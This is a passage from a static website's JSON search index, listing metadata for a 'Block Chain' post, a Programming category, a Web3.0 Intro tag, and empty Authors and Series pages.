2024","externalUrl":null,"permalink":"/posts/block-chain/","section":"Posts","summary":"Web 3.0","title":"Block Chain","type":"posts"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/categories/programming/","section":"Categories","summary":"","title":"Programming","type":"categories"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/web3.0-intro/","section":"Tags","summary":"","title":"Web3.0 Intro","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]